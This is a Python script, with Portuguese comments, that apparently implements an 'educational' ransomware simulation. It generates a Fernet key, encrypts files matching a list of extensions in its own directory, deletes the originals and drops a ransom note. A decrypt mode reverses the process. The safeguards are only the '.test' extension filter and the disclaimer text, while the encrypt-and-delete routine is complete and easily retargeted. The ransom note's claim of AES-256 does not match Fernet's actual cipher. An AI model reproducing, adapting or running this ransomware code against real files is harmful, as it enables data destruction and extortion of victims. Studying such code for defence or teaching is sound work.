import os
import sys
from cryptography.fernet import Fernet

# --- Configurações ---
# Lista de extensões de arquivo que o ransomware irá mirar.
# ATENÇÃO: Para fins de simulação e segurança, vamos focar apenas em arquivos de teste.
TARGET_EXTENSIONS = ['.test']
# Nome do arquivo que conterá a chave de criptografia.
KEY_FILE = 'chave.key'
# Nome do arquivo de resgate.
RANSOM_NOTE_FILE = 'LEIA_ME_RESGATE.txt'
# Diretório para simulação (o diretório atual do script).
TARGET_DIR = os.path.dirname(os.path.abspath(__file__))

def generate_key():
    """Gera uma nova chave Fernet e a salva em um arquivo."""
    key = Fernet.generate_key()
    with open(KEY_FILE, 'wb') as key_file:
        key_file.write(key)
    return key

def load_key():
    """Carrega a chave Fernet do arquivo."""
    try:
        with open(KEY_FILE, 'rb') as key_file:
            return key_file.read()
    except FileNotFoundError:
        print("ERRO: Arquivo de chave não encontrado. Impossível descriptografar.")
        sys.exit(1)

def encrypt_file(file_path, fernet):
    """Criptografa um único arquivo."""
    try:
        with open(file_path, 'rb') as file:
            file_data = file.read()
        
        encrypted_data = fernet.encrypt(file_data)
        
        with open(file_path + '.encrypted', 'wb') as file:
            file.write(encrypted_data)
            
        os.remove(file_path)
        print(f"  [+] Criptografado: {file_path}")
    except Exception as e:
        print(f"  [!] ERRO ao criptografar {file_path}: {e}")

def decrypt_file(file_path, fernet):
    """Descriptografa um único arquivo."""
    try:
        with open(file_path, 'rb') as file:
            encrypted_data = file.read()
            
        decrypted_data = fernet.decrypt(encrypted_data)
        
        original_file_path = file_path.replace('.encrypted', '')
        with open(original_file_path, 'wb') as file:
            file.write(decrypted_data)
            
        os.remove(file_path)
        print(f"  [+] Descriptografado: {original_file_path}")
    except Exception as e:
        print(f"  [!] ERRO ao descriptografar {file_path}: {e}")

def create_ransom_note(key):
    """Cria a nota de resgate."""
    note = f"""
!!! SEUS ARQUIVOS FORAM CRIPTOGRAFADOS !!!

Todos os seus documentos, fotos e arquivos importantes foram criptografados
usando o algoritmo AES-256.

Para recuperar seus arquivos, você deve seguir as instruções.
Esta é uma simulação educacional. Em um ataque real, as instruções
seriam o pagamento de um resgate em criptomoedas.

CHAVE DE DESCRIPTOGRAFIA (SIMULADA):
{key.decode()}

INSTRUÇÕES (SIMULADAS):
1. Execute o script com a opção 'descriptografar'.
2. Mantenha o arquivo '{KEY_FILE}' no mesmo diretório.

ESTE PROJETO É PARA FINS EDUCACIONAIS E DEVE SER USADO APENAS EM AMBIENTES CONTROLADOS.
"""
    with open(os.path.join(TARGET_DIR, RANSOM_NOTE_FILE), 'w') as f:
        f.write(note)
    print(f"\n[+] Nota de resgate '{RANSOM_NOTE_FILE}' criada.")

def scan_files(action):
    """Escaneia o diretório e executa a ação (criptografar/descriptografar)."""
    
    if action == 'encrypt':
        print(f"Iniciando Criptografia em: {TARGET_DIR}")
        key = generate_key()
        fernet = Fernet(key)
        create_ransom_note(key)
        
        for file in os.listdir(TARGET_DIR):
            if os.path.isfile(file) and any(file.endswith(ext) for ext in TARGET_EXTENSIONS):
                encrypt_file(file, fernet)
                
    elif action == 'decrypt':
        print(f"Iniciando Descriptografia em: {TARGET_DIR}")
        key = load_key()
        fernet = Fernet(key)
        
        for file in os.listdir(TARGET_DIR):
            if file.endswith('.encrypted'):
                decrypt_file(file, fernet)
        
        # Limpa os arquivos de resgate e chave após a descriptografia
        if os.path.exists(KEY_FILE):
            os.remove(KEY_FILE)
        if os.path.exists(RANSOM_NOTE_FILE):
            os.remove(RANSOM_NOTE_FILE)
        print("\n[+] Limpeza concluída. Chave e Nota de Resgate removidas.")
        
    else:
        print("Ação inválida. Use 'encrypt' ou 'decrypt'.")

def main():
    if len(sys.argv) != 2:
        print("Uso: python3 ransomware_simulado.py <ação>")
        print("Ações disponíveis: encrypt | decrypt")
        sys.exit(1)
        
    action = sys.argv[1].lower()
    scan_files(action)

if __name__ == '__main__':
    main()
